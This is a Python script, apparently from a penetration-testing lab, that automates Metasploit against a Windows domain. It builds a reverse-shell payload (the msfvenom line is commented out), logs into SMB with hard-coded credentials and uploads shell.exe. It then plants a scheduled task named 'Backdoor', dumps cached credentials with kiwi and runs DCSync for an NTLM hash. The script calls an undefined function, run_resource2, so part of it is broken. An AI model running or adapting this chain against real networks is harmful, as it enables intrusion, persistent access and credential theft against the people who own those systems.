#!/usr/bin/python3
import pexpect
import os

#Testing logging and msf_script.after for reference. Attempt on laptop with faster external drives for hyper-v

print ("INITIALISING")
print ("WELCOME")

#msfvenom
#process = pexpect.spawn('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
#process.expect('Final')
#print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")
print ("MSFVENOM SCRIPT ALREADY EXISTS")

# Start Metasploit
msf_script = pexpect.spawn('msfconsole', encoding='utf-8')
fout = open('Metascript_logs.txt','w', encoding='utf-8')
msf_script.logfile = fout

# Wait for Metasploit prompt
msf_script.expect('msf6')
print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print ("RUNNING WMIEXEC")
# Running resource1.rc
msf_script.sendline('resource resource1.rc')
print (msf_script.read)
msf_script.expect('auxiliary', timeout=120)
print ("WMIEXEC COMPLETED - SUCCESS")
print (msf_script.after)

print ("BEGINNING SMBCLIENT")
#SMB client put shell.exe
msf_script.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
msf_script.expect('password')
print ("ENTERING PASSWORD")
msf_script.sendline('Password!')
msf_script.expect('smb')

print ("PUTTING SHELL.EXE")
print (msf_script.after)

msf_script.sendline('put shell.exe')
msf_script.expect('smb')

print ("COMPLETE - EXITING")
print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('auxiliary')

print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
print (msf_script.after)

def run_resource(msf_script, resource_name):
    msf_script.sendline(f'resource {resource_name}.rc')
    index = msf_script.expect_exact(['meterpreter >', pexpect.TIMEOUT, pexpect.EOF], timeout=999)

    if index == 0:
        print(f"{resource_name.upper()} COMPLETED - ATTACK SUCCESS")
        print(msf_script.after)

        # Check if the meterpreter shell is presented
        msf_script.expect_exact('meterpreter >', timeout=10)
        msf_script.sendline('background')
        msf_script.expect_exact('msf6', timeout=10)
        print("BACKGROUND SUCCESS")
        print(msf_script.after)

    elif index == 1:
        # Check if the session timed out
        timeout_occurred = msf_script.expect_exact(['This session has expired', pexpect.TIMEOUT, pexpect.EOF], timeout=10)

        if timeout_occurred == 0:
            # Reattempt the resource
            print(f"SESSION TIMEOUT - REATTEMPTING {resource_name.upper()}.RC")
            msf_script.sendline(f'resource {resource_name}.rc')
            msf_script.expect_exact('auxiliary', timeout=999)
            run_resource(msf_script, resource_name)  # Call the function recursively
        elif timeout_occurred == 1:
            # Continue with the pexpect script
            print("EXPECTED SENDLINE NOT FOUND")
            # Your code to continue with the pexpect script goes here
        elif timeout_occurred == 2:
            # Restart from auxiliary expect if Ctrl+C doesn't cancel the current section
            print(f"{resource_name.upper()} RESTARTING - CANCELLED BY USER")
            msf_script.sendcontrol('c')
            msf_script.expect_exact('auxiliary', timeout=999)
            run_resource(msf_script, resource_name)  # Call the function recursively
            
print("BEGINNING MULTI HANDLER")
# Running resource2.rc
run_resource2(msf_script)

print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
print (msf_script.after)

print ("METERPRETER SHELL TO BACKGROUND")
msf_script.sendline('background')
msf_script.expect('auxiliary')

print ("BACKGROUND SUCCESS")
print (msf_script.after)


print ("BEGINNING PERSISTENCE SERVICES")
# Running resource3.rc
msf_script.sendline('resource resource3.rc')
msf_script.expect('meterpreter', timeout=120)

print ("SUCCESS - REQUESTING SHELL")
print (msf_script.after)

msf_script.sendline('shell')
msf_script.expect('C:\\ ', timeout=120)

print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
print (msf_script.after)

msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
msf_script.expect('C:\\ ')

print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('meterpreter')

print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
print (msf_script.after)


print (" BEGINNING PSEXEC")
# Running resource4.rc
msf_script.sendline('resource resource4.rc')
msf_script.expect('meterpreter')

print ("PSEXEC COMPLETED - ATTACK SUCCESS")
print (msf_script.after)

print ("STARTING KIWI")
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')

msf_script.sendline('kiwi_cmd lsadump::cache')
msf_script.expect('meterpreter')

print ("CACHE DUMP SUCCESS - EXITING KIWI")
print (msf_script.after)

msf_script.sendline('exit')
msf_script.expect('exploit')

print (msf_script.after)


print ("STARTING LATERAL MOVEMENT")
# Running resource5.rc
msf_script.sendline('resource resource5.rc')
msf_script.expect('meterpreter')
print (msf_script.after)

print ("REQUESTING SYSINFO")
msf_script.sendline('sysinfo')
msf_script.expect('meterpreter')
print (msf_script.after)


print ("SUCCESS - ENTERING SHELL")
msf_script.sendline('shell')
msf_script.expect('system32')
print (msf_script.after)


print ("SHELL ESTABLISHED - REQUESTING USERS")
msf_script.sendline('net users')
msf_script.expect('system32')
print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
print (msf_script.after)


msf_script.sendline('exit')
msf_script.expect('meterpreter')
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')
print (msf_script.after)

print ("KIWI LOADED - TESTING DCSYNC")
msf_script.sendline('dcsync_ntlm cdanvers')
msf_script.expect('meterpreter')

print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")


msf_script.close()
